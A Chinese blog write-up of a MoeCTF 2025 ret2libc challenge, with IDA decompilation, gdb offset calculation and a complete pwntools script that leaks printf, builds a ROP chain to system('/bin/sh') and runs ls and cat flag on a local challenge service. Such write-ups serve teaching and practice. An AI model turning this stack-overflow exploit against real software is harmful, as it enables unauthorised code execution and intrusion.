---
title: '西电CTF MoeCTF 2025 PWN 3 认识libc'
date: '2026-09-03T21:06:05+08:00'
lastmod: '2026-09-03T21:06:05+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=928)

根据题目提示，本题是ret2libc[^CTF Wiki]

依旧还是塞进IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  puts("The Oracle speaks...");
  puts("There is no system function in the .text segment.");
  printf("A gift of forbidden knowledge, the location of 'printf': %p\n", &printf);
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("\nNow, show me what you can do with this knowledge:");
  printf("> ");
  return read(0, buf, 0x100uLL);
}
```



这里给定了printf的地址，并且给了我们`libc.so.6`，可以算出libc的基址然后再次偏移。

但是看起来程序本体内不存在system和"/bin/sh"。

所以我们需要去libc里去请这两位。

> 由**System V AMD64 ABI**约定，system就一个输入，使用`RDI`寄存器，所以我们需要在跳转到system之前，把字符串的地址放到`RDI`中。
>
> 可以使用POP RDI来把栈上地址赋给RDI
>
> 这里我们需要寻找这样的gadget:
>
> > POP RDI
> >
> > RET
>
> 并且构造溢出使得栈:
>
> > system地址
> >
> > 字符串地址
> >
> > gadget地址
>
> 只需要一次就能够完成整个过程，非常的优雅非常的酷炫。



很遗憾我们没有找到美丽的。

```assembly
 5F      pop     rdi
 C3      retn
```

但是我们找到了。

```assembly
.text:000000000002A3E4 41 5F     pop     r15
.text:000000000002A3E6 C3        retn
```

截一段也能用。



下面开始栈溢出工作。

```assembly
.text:0000000000401215                 call    printf
.text:000000000040121A                 lea     rax, [rbp+buf]
.text:000000000040121E                 mov     edx, 100h       ; nbytes
.text:0000000000401223                 mov     rsi, rax        ; buf
.text:0000000000401226                 mov     edi, 0          ; fd
.text:000000000040122B                 call    _read
.text:0000000000401230                 nop
.text:0000000000401231                 leave
.text:0000000000401232                 retn
```

找到buf的地址，在rsi寄存器内。

然后gdb打断点，查看寄存器。

```
GNU gdb (Ubuntu 15.1-1ubuntu1~24.04.1) 15.1
...
(gdb) b *0x401226
Breakpoint 1 at 0x401226
(gdb) r
Starting program: /mnt/path/to/pwn
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
The Oracle speaks...
There is no system function in the .text segment.
A gift of forbidden knowledge, the location of 'printf': 0x7ffff7c60100

Now, show me what you can do with this knowledge:
>
Breakpoint 1, 0x0000000000401226 in vuln ()
(gdb) info registers
rax            0x7fffffffd7b0      140737488345008
rbx            0x7fffffffd928      140737488345384
rcx            0x0                 0
rdx            0x100               256
rsi            0x7fffffffd7b0      140737488345008
rdi            0x7fffffffd5d0      140737488344528
rbp            0x7fffffffd7f0      0x7fffffffd7f0
rsp            0x7fffffffd7b0      0x7fffffffd7b0
...
```

buf的地址为0x7fffffffd7b0。

栈底rbp在0x7fffffffd7f0。

所以返回地址距离buf为0xf0 - 0xb0 + 0x8 = 0x48 即 72个字节。



pwntools脚本:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 11997)

io.recvuntil(b'\'printf\':')

data = int(io.recv(16), 16)

print(hex(data))
print((data))

baseAdd = data - 0x606f0

gadgetAdd = baseAdd + 0x2a3e5
stringAdd = baseAdd + 0x1d8678
systemAdd = baseAdd + 0x50d70

retAdd = baseAdd + 0xc6c2f

io.send(b'A' * 72 + p64(gadgetAdd) + p64(stringAdd) + p64(retAdd) + p64(systemAdd))

io.interactive()

```

> 这里我们在gadget中额外调用了一次ret，但是没有对应的call，造成了rsp没有16位对齐。
>
> 所以需要额外ret一次来对齐。

```
[x] Opening connection to 127.0.0.1 on port 11997
[x] Opening connection to 127.0.0.1 on port 11997: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 11997: Done
[DEBUG] Received 0x14 bytes:
    b'The Oracle speaks...'
[DEBUG] Received 0xb0 bytes:
    b'\n'
    b'There is no system function in the .text segment.\n'
    b"A gift of forbidden knowledge, the location of 'printf': 0x7feccf7716f0\n"
    b'\n'
    b'Now, show me what you can do with this knowledge:\n'
    b'> '
0x7feccf7716f0
140655069697776
[DEBUG] Sent 0x68 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  e5 b3 73 cf  ec 7f 00 00  │AAAA│AAAA│··s·│····│
    00000050  78 96 8e cf  ec 7f 00 00  2f 7c 7d cf  ec 7f 00 00  │x···│····│/|}·│····│
    00000060  70 1d 76 cf  ec 7f 00 00                            │p·v·│····│
    00000068
[*] Switching to interactive mode

Now, show me what you can do with this knowledge:
> ls

[DEBUG] Sent ...
[DEBUG] Received ...

bin
flag
lib
lib32
lib64
libexec
libx32
pwn

cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 11997
```











[^CTF Wiki]:[ret2libc](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc)
